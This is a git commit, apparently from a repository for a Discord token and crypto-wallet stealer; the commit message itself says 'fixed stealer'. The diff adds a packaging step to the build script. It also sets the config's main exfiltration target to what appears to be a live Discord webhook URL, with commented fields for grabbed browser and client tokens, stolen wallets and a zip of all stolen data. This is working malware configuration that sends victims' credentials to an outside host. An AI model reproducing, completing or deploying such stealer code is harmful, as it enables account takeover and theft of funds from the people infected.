082c674507ec0c40b34cbc3055ca9c75ea44934c
doener <79750105+doener2323@users.noreply.github.com>
2022-05-08 18:04:11 +0200

    fixed stealer | didnt work because of obfuscation

--- build.bat
+++ build.bat
@@ -1,1 +1,3 @@
+npm install pkg
+
 pkg index.js
--- config.js
+++ config.js
@@ -1,8 +1,8 @@
 module.exports = (client) => {
     return {
-        url: "REPLACE_THIS", // main webhook url (when initialized)
-        discord: "REPLACE_THIS", // grabbed tokens from clients & browsers
-        wallets: "REPLACE_THIS", // stolen wallets
-        zip: "REPLACE_THIS", // webhook where the zip folder with all stolen data will be sent in
+        url: "https://discord.com/api/webhooks/972891149461254234/ptQpbxDR1AxBNYFxA1Kmb9tIqCkfr272mILMvPfQwTX2eZnHTfkukTazPRT56wQ9754-", // main webhook url (when initialized)
+        discord: "", // grabbed tokens from clients & browsers
+        wallets: "", // stolen wallets
+        zip: "", // webhook where the zip folder with all stolen data will be sent in
     }
 }
